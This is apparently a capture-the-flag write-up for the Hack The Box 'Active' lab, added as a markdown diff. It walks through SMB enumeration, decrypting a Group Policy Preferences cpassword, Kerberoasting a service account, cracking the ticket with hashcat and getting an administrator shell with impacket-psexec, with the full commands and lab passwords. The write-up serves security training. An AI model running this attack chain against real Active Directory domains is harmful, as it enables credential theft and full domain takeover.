@@ -1,0 +1,107 @@
+# Active (easy)
+
+Make sure to add these to `/etc/hosts`
+
+```powershell
+echo "[target ip] active.htb" | sudo tee -a /etc/hosts
+```
+
+## Enumeration
+
+### NMAP
+
+![image.png](Active%20(easy)/image.png)
+
+```powershell
+sudo nmap -A [TARGET IP] -p-
+```
+
+`445/tcp   open  microsoft-ds?` indicates SMB is open.
+
+### enum4linux
+
+Let’s use enum4linux to leverage an SMB Null session and LDAP anonymous bind
+
+```powershell
+enum4linux -a -u "" -p "" [TARGET IP]
+```
+
+![image.png](Active%20(easy)/image%201.png)
+
+As we can see, there are 7 SMB shares , and the only share that allows anonymous read access is `10.129.190.23/Replication`
+
+I found `Groups.xml` in \active.htb\Policies\{31B2F340-016D-11D2-945F 00C04FB984F9}\MACHINE\Preferences\Groups.
+
+Then inside the smbclient prompt, we can save the Groups.xml file to our local machine.
+
+```powershell
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget Groups.xml (mget is a shortcut, if you already know the path use ↓ )
+smb: \> get active.htb/Policies/{long-GUID}/MACHINE/Preferences/Groups/Groups.xml
+```
+
+![image.png](Active%20(easy)/image%202.png)
+
+### **Groups.xml content**
+
+```powershell
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+```
+
+As we can see the cPassword is decrypted, we can use gpp-decrypt to grab the `cPassword` value.
+
+```powershell
+└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+GPPstillStandingStrong2k18
+```
+
+We have user: SVC_TGS and password: GPPstillStandingStrong2k18
+
+Let’s verify if the creds work:
+
+```powershell
+smbmap -H [target ip] -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+```
+
+![image.png](Active%20(easy)/image%203.png)
+
+Creds work now we can try to access it !
+
+```powershell
+smbclient //[target ip]/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
+```
+
+![image.png](Active%20(easy)/image%204.png)
+
+After enumerating around, I found the flag user.txt in `SVC_TGS\Desktop`
+
+![image.png](Active%20(easy)/image%205.png)
+
+Since it is an active directory environment, we can Kerberoast that service account:
+
+```jsx
+impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.190.217 -request
+```
+
+![image.png](Active%20(easy)/image%206.png)
+
+We got the hash TGS ticket now we can try to crack it using hashcat
+
+```jsx
+hashcat -m 13100 ~/Desktop/hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+![image.png](Active%20(easy)/image%207.png)
+
+The password is `Ticketmaster1968`
+
+Now let’s try to login with the new credential:
+
+![image.png](Active%20(easy)/image%208.png)
+
+```jsx
+impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.190.217
+```
